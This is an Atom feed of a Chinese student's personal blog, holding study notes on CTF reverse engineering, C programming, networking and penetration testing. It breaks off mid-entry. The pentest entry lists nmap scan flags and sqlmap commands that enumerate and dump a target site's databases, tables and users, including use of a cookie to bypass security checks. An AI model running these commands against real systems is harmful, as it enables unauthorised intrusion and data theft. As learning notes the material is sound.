<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>猫涅的秘密结社</title>
  <icon>https://www.maonie.top/icon.png</icon>
  <subtitle>嗯..喵?</subtitle>
  <link href="https://www.maonie.top/atom.xml" rel="self"/>
  
  <link href="https://www.maonie.top/"/>
  <updated>2024-08-07T03:38:25.525Z</updated>
  <id>https://www.maonie.top/</id>
  
  <author>
    <name>nirvanafelis</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>逆逆逆逆逆向-CTF之reverse</title>
    <link href="https://www.maonie.top/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/"/>
    <id>https://www.maonie.top/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/</id>
    <published>2024-08-05T04:10:49.000Z</published>
    <updated>2024-08-07T03:38:25.525Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类"><a href="#既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类" class="headerlink" title="既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类"></a>既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类</h1><p>关键基本都在ipa pro的使用<br>以及反编程后的信息搜集</p><pre class="line-numbers language-none"><code class="language-none">~目前来说有用的记录~shift+f12 查看字符串 ctrl+X 查询该字符串对应内存的相关调用f5 查看伪c代码代码中的变量直接选中后双击就可查看具体内容ipa pro的环境目录内最好是纯英文 不然会出各种各样的bug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="测试题-BUUCTF-easyre1"><a href="#测试题-BUUCTF-easyre1" class="headerlink" title="测试题 BUUCTF-easyre1"></a>测试题 BUUCTF-easyre1</h2><span id="more"></span><p>将题目提供的exe以ipa pro打开<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/1.jpg" alt="1"><br>ipa pro会自动判断我们提供软件的类型并提供选择 这里直接点击ok<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/2.jpg" alt="2"><br>软件内有很多不同的视窗 我们来主要分析他生成的视窗化代码<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/3.jpg" alt="3"><br>很明显这段就是flag 输入后便能完成题目</p><p>目前先更到这里 后面主要讲解ipa pro 的各项功能和视窗的不同 然后再来两个例题</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类&quot;&gt;&lt;a href=&quot;#既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类&quot; class=&quot;headerlink&quot; title=&quot;既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类&quot;&gt;&lt;/a&gt;既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类&lt;/h1&gt;&lt;p&gt;关键基本都在ipa pro的使用&lt;br&gt;以及反编程后的信息搜集&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;~目前来说有用的记录~
shift+f12 查看字符串 
ctrl+X 查询该字符串对应内存的相关调用
f5 查看伪c代码
代码中的变量直接选中后双击就可查看具体内容

ipa pro的环境目录内最好是纯英文 不然会出各种各样的bug&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;测试题-BUUCTF-easyre1&quot;&gt;&lt;a href=&quot;#测试题-BUUCTF-easyre1&quot; class=&quot;headerlink&quot; title=&quot;测试题 BUUCTF-easyre1&quot;&gt;&lt;/a&gt;测试题 BUUCTF-easyre1&lt;/h2&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>求解</title>
    <link href="https://www.maonie.top/2024/07/14/%E6%B1%82%E8%A7%A3/"/>
    <id>https://www.maonie.top/2024/07/14/%E6%B1%82%E8%A7%A3/</id>
    <published>2024-07-14T05:35:44.000Z</published>
    <updated>2024-08-02T06:25:54.897Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="这里记录一下暑假两个月自学的笔记"><a href="#这里记录一下暑假两个月自学的笔记" class="headerlink" title="这里记录一下暑假两个月自学的笔记"></a>这里记录一下暑假两个月自学的笔记</h1><p>汇编语言-给电脑看的语言 虽然也是要被转化为0与1的 但层次更为粗糙 可读性更低<br>vscode的debugger<br>make clang debug50等用法</p><span id="more"></span><h4 id="声明数组"><a href="#声明数组" class="headerlink" title="声明数组"></a>声明数组</h4><p>int 数组名[数组大小]<br>数组名[从零开始的数组序号] = 变量名</p><pre class="line-numbers language-none"><code class="language-none">例int scores[3];scores[0] = 72;scores[1] = 77;scores[2] = 98;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过get_int函数达到获取int数值的作用</p><p>const是常量 定义之后无法再更改<br>例<br><code>const int n =3</code></p><p>数据在处理的时候会占用内存<br>而每段数据为了表明字符串已结束会多加一个字节<br>例： 3个字符 将占用3+1个字节</p><p>string 字符串 由char（字符） 组成<img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/image.png" alt="image"></p><p>大写和小写字母在acsii码中正好差32<br>小写转大写减去32即可<br><img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/12.png" alt="12"></p><p>比较string用的是strcmp（string1，string2）<br><img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/22.png" alt="22"><br>linear search 线性<br>binary search 二分<br>还有排序相关的<br>选择排序算法<br>一次一次选最小的元素 放到最左边</p><p>冒泡排序算法<br>抓出来一个和别的依次比较<br>假如大就往右移（互换位置）<br>然后依次解决</p><p>选择排序的次数是n（n-1）/2 (已编辑)<br>数量大概是n的平方</p><p>冒泡排序的次数为（n-1）（n-1）<br>这俩的上限其实都差不多<br>这俩的上界都是n方<br>下界是<br>冒泡排序在数据已经接近或已经有序的情况下<br>更有优势吧<br>感觉这俩更像是两个顺序不同的排序<br>选择排序主要是从左到右筛选<br>冒泡排序主要是从右到左</p><p>然后是在函数里套函数的情况<br>void draw(int n)<br>{}<br><img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/31.png" alt="31"><br>归并排序<br>把数据拆成两半<br>并分别排好顺序<br>例<br>0136 2457<br>然后先看两边的第一个<br>0<br>排前面<br>现在揭露0右边的1<br>再把1和2比较<br>以此类推<br>归并会将这些数据先拆成两个两个<br>二个排序→四个排序→八个排序<br>以此类推<br>有更好的效率</p><p>%p 输出地址<br>变量名前面要加上&amp;<br>上面这个是在printf中的用法<br>定义时使用<code>*p</code> 表明p是一个指针</p><p>静态数组：静态定义的数组在程序加载的时候就已经分配了内存空间，直到函数结束或者程序结束后才会被释放；%20动态数组：由malloc()或new()等函数定义的数组，在程序运行时才申请内存空间，使用完后可以借助free()或delete()手动释放。</p><p>以scanf来获取数据</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;这里记录一下暑假两个月自学的笔记&quot;&gt;&lt;a href=&quot;#这里记录一下暑假两个月自学的笔记&quot; class=&quot;headerlink&quot; title=&quot;这里记录一下暑假两个月自学的笔记&quot;&gt;&lt;/a&gt;这里记录一下暑假两个月自学的笔记&lt;/h1&gt;&lt;p&gt;汇编语言-给电脑看的语言 虽然也是要被转化为0与1的 但层次更为粗糙 可读性更低&lt;br&gt;vscode的debugger&lt;br&gt;make clang debug50等用法&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>夺旗时间</title>
    <link href="https://www.maonie.top/2024/06/08/%E5%A4%BA%E6%97%97%E6%97%B6%E9%97%B4/"/>
    <id>https://www.maonie.top/2024/06/08/%E5%A4%BA%E6%97%97%E6%97%B6%E9%97%B4/</id>
    <published>2024-06-08T05:22:16.000Z</published>
    <updated>2024-06-12T06:26:07.323Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>三个月的假期准确来说还没到 在这之前 预热一下CTF的学习</p><h2 id="CTF题目类别"><a href="#CTF题目类别" class="headerlink" title="CTF题目类别"></a>CTF题目类别</h2><p>-Reverse<br>-题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译功底。主要考查参赛选手的逆向分析能力。<br>-所需知识：汇编语言、加密与解密、常见反编译工具</p><p>-Pwn<br>-Pwn 在黑客俚语中代表着攻破，获取权限，在 CTF 比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有整数溢出、栈溢出、堆溢出等。主要考查参赛选手对漏洞的利用能力。<br>-所需知识：C，OD+IDA，数据结构，操作系统</p><p>-Web<br>-Web 是 CTF 的主要题型，题目涉及到许多常见的 Web 漏洞，如 XSS、文件包含、代码执行、上传漏洞、SQL 注入等。也有一些简单的关于网络基础知识的考察，如返回包、TCP/IP、数据包内容和构造。可以说题目环境比较接近真实环境。<br>-所需知识：PHP、Python、TCP/IP、SQL</p><p>-Crypto<br>-题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及一些常见编码解码，主要考查参赛选手密码学相关知识点。通常也会和其他题目相结合。<br>-所需知识：矩阵、数论、密码学</p><p>-Misc<br>-Misc 即安全杂项，题目涉及隐写术、流量分析、电子取证、人肉搜索、数据分析、大数据统计等，覆盖面比较广，主要考查参赛选手的各种基础综合知识。<br>-所需知识：常见隐写术工具、Wireshark 等流量审查工具、编码知识</p><p>-Mobile<br>-主要分为 Android 和 iOS 两个平台，以 Android 逆向为主，破解 APK 并提交正确答案。<br>-所需知识：Java，Android 开发，常见工具</p><h2 id="至于知识点"><a href="#至于知识点" class="headerlink" title="至于知识点"></a>至于知识点</h2><p>linux基础<br>HTML基础<br>HTTP协议基础<br>JAVASCRIPT基础<br>Web服务器基础<br>Owasp漏洞基础<br>PHP代码审计基础</p><p>C/C++基础<br>汇编语言基础(我目前的努力方向)</p><h2 id="汇编语言基础相关（以x86为核心）"><a href="#汇编语言基础相关（以x86为核心）" class="headerlink" title="汇编语言基础相关（以x86为核心）"></a>汇编语言基础相关（以x86为核心）</h2></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>学学学</title>
    <link href="https://www.maonie.top/2024/06/01/%E5%AD%A6%E5%AD%A6%E5%AD%A6/"/>
    <id>https://www.maonie.top/2024/06/01/%E5%AD%A6%E5%AD%A6%E5%AD%A6/</id>
    <published>2024-06-01T01:01:38.000Z</published>
    <updated>2024-06-03T04:29:26.221Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>差不多类似于现状汇报？</p><ul><li>还活着</li><li>转段考通过了 考进大学了</li><li>目前在健身+寻找新的爱好 目标</li></ul><p>破费在阿里云里花了600多 开了个teamspeak服务器<br>嘛 至少能坚持三年 结果是令人满意的<br>至于开服的具体细节 还请自行搜索</p></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常牢骚" scheme="https://www.maonie.top/categories/%E6%97%A5%E5%B8%B8%E7%89%A2%E9%AA%9A/"/>
    
    
    <category term="告示" scheme="https://www.maonie.top/tags/%E5%91%8A%E7%A4%BA/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试相关</title>
    <link href="https://www.maonie.top/2024/05/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/"/>
    <id>https://www.maonie.top/2024/05/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/</id>
    <published>2024-05-06T07:47:16.000Z</published>
    <updated>2024-05-08T03:49:14.508Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>目前确定的说法之渗透测试的<strong>生命周期</strong></p><blockquote><p>渗透测试项目的生命周期可分为如下7个阶段：需求分析、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透测试、撰写报告。<br>以下是PETS渗透测试项目生命周期的主要阶段：<br>1.前期交互阶段：<br>•与客户组织进行深入讨论，明确渗透测试的范围和目标。<br>•确保客户组织了解并同意测试所涉及的内容，从而确保测试的顺利进行。<br>2.情报搜集阶段：<br>•使用各种方法和技术来收集目标系统的信息，包括操作系统、开放的端口、网络架构等。<br>•通过社交媒体网络、Google Hacking技术、目标系统踩点等方式获取目标系统的详细信息。<br>3.威胁建模阶段：<br>•利用情报搜集阶段获取的信息，分析目标系统上可能存在的安全漏洞和弱点。<br>•识别潜在的安全风险，并为后续的渗透攻击阶段制定策略。<br>4.漏洞分析阶段：<br>•综合前面阶段获取的信息，分析哪些攻击途径是可行的。<br>•评估漏洞的严重程度和潜在影响，为攻击阶段提供决策依据。<br>5.渗透攻击阶段：<br>•根据前面的分析结果，对目标系统实施渗透攻击。<br>•尝试利用已发现的漏洞，获取目标系统的权限或访问敏感数据。<br>6.后渗透攻击阶段：<br>•在成功渗透后，进一步探索目标系统，获取更多的信息和权限。<br>•评估客户组织可能面临的最大业务风险，并提供相应的安全建议。<br>7.报告阶段：<br>•编写详细的渗透测试报告，记录测试过程和发现的问题。<br>•从防御者的角度提出针对性的安全建议和改进措施，帮助客户组织加强安全防护。<br>请注意，每个阶段都至关重要，需要精心设计和执行。同时，与客户保持良好的沟通和合作也是确保测试成功的关键。在整个生命周期中，测试人员需要遵循安全准则和最佳实践，确保测试的合法性和道德性。</p></blockquote><p>熟记即可<br><strong>简述题</strong> 列举常用渗透测试工具。</p><blockquote><p>信息收集类工具有nmap、fping、dnsmap等<br>漏洞分析类工具有sqlmap、nessus、awvs等<br>漏洞利用类工具有metasploit、burpsuite等<br>密码破解类工具有hydra、john、hashcat等<br>数据分析类工具有wireshark等。</p></blockquote><p>简述扫描技术的分类<br>扫描技术按照不同划分标准有不同的分类方式。如按照扫描技术分类可分为TCP扫描、UDP扫描，ICMP扫描、ARP扫描。其中TCP扫描又分为TCP CONNECT()扫描、TCP SYN扫描（这种方法较为常见）。ARP扫描效率较高，但不能跨网段，且工作在数据链路层，主要用于探测本地局域网中的主机存活情况。按照扫描所使用协议的工作层次，可分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。</p><span id="more"></span><p>然后是渗透测试要用到的工具相关</p><h1 id="一、nmap"><a href="#一、nmap" class="headerlink" title="一、nmap"></a>一、nmap</h1><p>nmap的主要功能包括目标主机存活性扫描(-sn)、端口扫描（-sS或-p80,443）、操作系统信息探测(-O)、漏洞信息探测(–script==default)。</p><p>nmap如下选项具体用途（-sn，-p-，-sV，-O，-sT，-sS，-sU）</p><pre class="line-numbers language-none"><code class="language-none">-sn 主机存活性扫描，类似于-sP;-p- 全端口扫描，类似于-p1-65535-sV 服务及版本扫描-O 操作系统类型探测-sT 全连接扫描（与目标建立完整三次握手）-sS 半连接扫描-sU UDP方式扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>简述nmap探测主机存活的技术有哪些？</strong></p><p><strong>Q:</strong> 按照扫描技术分类，Nmap的扫描可以分为TCP扫描、UDP扫描、ICMP扫描和ARP扫描等。</p><ol><li><strong>TCP</strong> <strong>扫描</strong>：TCP扫描是最常用的扫描类型之一，主要用于探测目标主机上开放的TCP端口和提供的TCP服务。TCP扫描又可以分为TCP connect()扫描和TCP SYN扫描等方法。<br>o  <strong>TCP connect()</strong> <strong>扫描</strong>：这是最基本的TCP扫描方式，通过尝试与目标主机的每个TCP端口建立完整的三次握手连接来判断端口是否开放。<br>o  <strong>TCP SYN</strong> <strong>扫描</strong>：SYN扫描是Nmap的默认扫描方式。它向目标主机的端口发送一个SYN数据包，并等待SYN/ACK响应。如果收到响应，则认为该端口是开放的。SYN扫描的优点是速度快且不易被检测到，因为它不会完成整个三次握手。</li><li><strong>UDP</strong> <strong>扫描</strong>：UDP扫描用于探测目标主机上开放的UDP端口。由于UDP是无连接的协议，因此UDP扫描通常比TCP扫描更困难。</li><li><strong>ICMP</strong> <strong>扫描</strong>：ICMP扫描主要利用ICMP协议来探测目标主机的网络连通性和可达性。</li><li><strong>ARP</strong> <strong>扫描</strong>：ARP扫描是一种在本地局域网中非常有效的主机发现方法。它通过发送ARP请求来探测目标主机是否存活。ARP扫描的效率很高，但不能跨网段，且只能扫描主机存活情况，不能探测端口开放情况。<br>其次，按照扫描所使用的协议工作层次，Nmap的扫描可以分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。</li></ol><p>·     <strong>二层扫描（ARP）</strong>：在数据链路层进行扫描，主要用于探测本地局域网中的主机存活情况。<br>·     <strong>三层扫描（ICMP、IP）</strong>：在网络层进行扫描，主要用于探测目标主机的网络连通性和可达性。<br>·     <strong>四层扫描（TCP、UDP）</strong>：在传输层进行扫描，主要用于探测目标主机上开放的TCP和UDP端口以及提供的服务。<br>总的来说，Nmap的扫描技术非常丰富和灵活，可以根据不同的需求和目的选择不同的扫描类型选项，以获取更全面和详细的扫描结果。</p><h1 id="二、sqlmap"><a href="#二、sqlmap" class="headerlink" title="二、sqlmap"></a>二、sqlmap</h1><h2 id="总之介绍一下各种参数吧"><a href="#总之介绍一下各种参数吧" class="headerlink" title="总之介绍一下各种参数吧"></a>总之介绍一下各种参数吧</h2><p>一般起始是python sqlmap.py</p><p>-u 决定目标url<br><code>sqlmap -u '目标地址'</code><br>–cookie 设置cookie 绕过安全检查<br><code>sqlmap -u '目标地址' --cookie 'cookie值'</code><br>–dbs 列出所有数据库<br><code>sqlmap -u '目标地址' --dbs</code><br>-D 指定数据库 –tables 爆出所有表<br><code>sqlmap -u '目标地址' -D '库名' --tables</code><br>-T 指定表 –dump 爆出所有数据<br><code>sqlmap -u '目标地址' -D '库名' -T '表名' --dump</code><br>–current-user 显示当前用户<br><code>sqlmap -u '目标地址' --current-user</code><br>–is-dba 检测是否为数据库管理员<br><code>sqlmap -u '目标地址' --is-dba</code><br>–users 获取所有用户<br><code>sqlmap -u '目标地址' --users</code></p><h2 id="然后是手动注入"><a href="#然后是手动注入" class="headerlink" title="然后是手动注入"></a>然后是手动注入</h2><p>这块我不太懂先略过</p><h1 id="三、BURPSUITE"><a href="#三、BURPSUITE" class="headerlink" title="三、BURPSUITE"></a>三、BURPSUITE</h1><p>主要是针对web应用程序的攻击 一款集成化的渗透测试工具<br>主要功能是抓包 改包 自带一个暴力破解模块 有四种attack type(攻击类型)</p><ul><li>Sinper（狙击手）</li><li>Battering ram（攻城槌）</li><li>Pitchfork（干草叉）</li><li>Cluster bomb（集束炸弹）</li></ul><h1 id="四、Ettercap"><a href="#四、Ettercap" class="headerlink" title="四、Ettercap"></a>四、Ettercap</h1><p>主要用于伪造或篡改数据包以实现SRP DNS协议的中间人攻击<br>没了</p><h1 id="五、metasploit"><a href="#五、metasploit" class="headerlink" title="五、metasploit"></a>五、metasploit</h1><p>Metasploit框架的核心组成部分包括exploit（漏洞利用模块）、payload（负载模块）、auxiliary（辅助模块）和post（后渗透模块）<br>exploit模块负责利用目标系统的漏洞<br>payload模块则负责在成功利用漏洞后执行特定任务<br>auxiliary模块提供非攻击性质的功能 如扫描、枚举和信息收集<br>post模块则用于在取得目标系统权限后进行进一步的信息收集和权限维持</p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;目前确定的说法之渗透测试的&lt;strong&gt;生命周期&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;渗透测试项目的生命周期可分为如下7个阶段：需求分析、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透测试、撰写报告。&lt;br&gt;以下是PETS渗透测试项目生命周期的主要阶段：&lt;br&gt;1.	前期交互阶段：&lt;br&gt;•	与客户组织进行深入讨论，明确渗透测试的范围和目标。&lt;br&gt;•	确保客户组织了解并同意测试所涉及的内容，从而确保测试的顺利进行。&lt;br&gt;2.	情报搜集阶段：&lt;br&gt;•	使用各种方法和技术来收集目标系统的信息，包括操作系统、开放的端口、网络架构等。&lt;br&gt;•	通过社交媒体网络、Google Hacking技术、目标系统踩点等方式获取目标系统的详细信息。&lt;br&gt;3.	威胁建模阶段：&lt;br&gt;•	利用情报搜集阶段获取的信息，分析目标系统上可能存在的安全漏洞和弱点。&lt;br&gt;•	识别潜在的安全风险，并为后续的渗透攻击阶段制定策略。&lt;br&gt;4.	漏洞分析阶段：&lt;br&gt;•	综合前面阶段获取的信息，分析哪些攻击途径是可行的。&lt;br&gt;•	评估漏洞的严重程度和潜在影响，为攻击阶段提供决策依据。&lt;br&gt;5.	渗透攻击阶段：&lt;br&gt;•	根据前面的分析结果，对目标系统实施渗透攻击。&lt;br&gt;•	尝试利用已发现的漏洞，获取目标系统的权限或访问敏感数据。&lt;br&gt;6.	后渗透攻击阶段：&lt;br&gt;•	在成功渗透后，进一步探索目标系统，获取更多的信息和权限。&lt;br&gt;•	评估客户组织可能面临的最大业务风险，并提供相应的安全建议。&lt;br&gt;7.	报告阶段：&lt;br&gt;•	编写详细的渗透测试报告，记录测试过程和发现的问题。&lt;br&gt;•	从防御者的角度提出针对性的安全建议和改进措施，帮助客户组织加强安全防护。&lt;br&gt;请注意，每个阶段都至关重要，需要精心设计和执行。同时，与客户保持良好的沟通和合作也是确保测试成功的关键。在整个生命周期中，测试人员需要遵循安全准则和最佳实践，确保测试的合法性和道德性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;熟记即可&lt;br&gt;&lt;strong&gt;简述题&lt;/strong&gt; 列举常用渗透测试工具。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;信息收集类工具有nmap、fping、dnsmap等&lt;br&gt;漏洞分析类工具有sqlmap、nessus、awvs等&lt;br&gt;漏洞利用类工具有metasploit、burpsuite等&lt;br&gt;密码破解类工具有hydra、john、hashcat等&lt;br&gt;数据分析类工具有wireshark等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;简述扫描技术的分类&lt;br&gt;扫描技术按照不同划分标准有不同的分类方式。如按照扫描技术分类可分为TCP扫描、UDP扫描，ICMP扫描、ARP扫描。其中TCP扫描又分为TCP CONNECT()扫描、TCP SYN扫描（这种方法较为常见）。ARP扫描效率较高，但不能跨网段，且工作在数据链路层，主要用于探测本地局域网中的主机存活情况。按照扫描所使用协议的工作层次，可分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>协议/漏洞/网络</title>
    <link href="https://www.maonie.top/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/"/>
    <id>https://www.maonie.top/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/</id>
    <published>2024-05-05T02:10:55.000Z</published>
    <updated>2024-05-14T00:41:38.803Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>从头到尾再来一遍的感觉吧</p><span id="more"></span><h1 id="一、协议相关"><a href="#一、协议相关" class="headerlink" title="一、协议相关"></a>一、协议相关</h1><blockquote><p>网络通信协议是根据网络上的节点进行通信的一组规则，每种设备都可以根据通信协议识别其他设备的信息。</p></blockquote><h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2><p>要讲网络协议 我们得先从OSI七层模型说起 OSI将网络通信分为七个层次 每个层次负责特定的功能 并且每个层次都与特定的协议相关联<br>它们分别为物理层、数据链路层、网络层、传输层、会话层、表示层和应用层</p><ol><li><strong>物理层：把网络连接在一起的物理手段 负责传送0与1的电信号</strong></li><li><strong>数据链路层：决定0与1的解读 分组方式</strong> 相关协议:ARP协议</li><li><strong>网络层：引进一套新的地址——“网络地址” 使得我们能区分不同的计算机是否属于同一个子网络 建立主机到主机的通信</strong> 相关协议：IP、ICMP协议</li><li><strong>传输层：有了MAC地址和IP地址 我们还需要一个参数 表示这个数据包到底供哪个程序来使用 这个参数就叫’端口’ 实现端口到端口的通信</strong> 相关协议：TCP、UDP协议</li><li><strong>会话层：负责建立和断开通信连接，以及数据的分割等传输相关的管理 （例：何时建立连接？何时断开连接？该保持多久的连接？）</strong>相关协议：SSL、TLS协议</li><li><strong>表示层：设备固有的数据格式与网络标准数据格式之间的转换 （接受不同的信息，例如文字流、图像、声音等）</strong></li><li><strong>应用层：针对特定应用的协议 网络服务与最终用户的一个接口</strong> 相关协议：HTTP、FTP、DNS、DHCP等协议<br><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/1.png" alt="1"></li></ol><h2 id="HTTP协议-端口号80-HTTPS协议-端口号443"><a href="#HTTP协议-端口号80-HTTPS协议-端口号443" class="headerlink" title="HTTP协议 端口号80 HTTPS协议 端口号443"></a>HTTP协议 端口号80 HTTPS协议 端口号443</h2><p><strong>Web交互的基本流程</strong><br>请求：客户端根据服务器地址把数据发送给服务器的过程叫请求。<br>响应：服务器将请求的处理结果发送给浏览器的过程叫响应。</p><p><strong>什么是HTTP？</strong><br>概念：超文本传输协议。</p><h3 id="HTTP有什么特点？"><a href="#HTTP有什么特点？" class="headerlink" 